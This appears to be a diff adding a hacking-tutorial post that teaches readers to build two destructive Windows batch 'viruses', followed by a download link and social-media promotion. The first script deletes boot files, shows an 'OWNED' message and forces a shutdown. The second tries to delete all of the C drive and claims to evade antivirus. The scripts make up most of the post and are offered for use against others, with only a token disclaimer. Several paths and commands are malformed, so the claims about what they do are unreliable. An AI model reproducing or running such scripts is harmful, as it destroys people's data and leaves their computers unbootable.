@@ -1,0 +1,57 @@
+ 1. How To Make A Virus that can Crash any Computer or Laptop
+Step 1. Open Notepad.
+Step 2. Copy the following code below:
+
+
+
+@echo off
+attrib -r -s -h c:autoexec.bat
+del c:autoexec.bat
+attrib -r -s -h c:boot.ini
+del c:boot.ini
+attrib -r -s -h c:ntldr
+del c:ntldr
+attrib -r -s -h c:windowswin.ini
+del c:windowswin.ini
+@echo off
+msg * YOU GOT OWNED!!!
+shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive
+
+Step 3. Save As Anything.bat File In Notepad!!
+
+This Will Pop Up A Message Saying OWNED!!
+And Shut Down The Computer Never To Reboot Again!
+
+2. Make Second Virus That will delete c drive permanatly :
+
+What will this virus do ?  
+You will create this virus using batch file programming. This virus will delete the C Drive completely. The good thing about this virus is that it is not detected by antivirus.
+
+How to Make the virus ?
+   1. Open Notepad and copy below code into it.
+@Echo off
+Del C:\ *.* |y
+
+   2. Save this file as virus.bat (Name can be anything but .bat is must)
+   3. Now, running this file will delete all the content of C Drive.
+
+
+Warning: Please don't try to run on your own computer or else it will delete all the content of your C Drive. I will not be responsible for any damage done to your computer. 
+
+Download  Code File :https://goo.gl/gXoVRg
+
+I Starting My New Channel For Real Hacking because i cant Upload Hacking video On my This Channel So please Subscribe My Channel
+https://www.youtube.com/channel/UCKBN...
+
+
+Follow My Blog     :  
+ https://gadgets-tricks.blogspot.in/
+
+Follow On Facebook :  
+https://www.facebook.com/gadgetstrick...
+
+Subscribe My Channel :
+https://www..com/channel/UChUqeQNmgNh...
+
+Google Plus :
+https://plus.google.com/u/0/105795666...
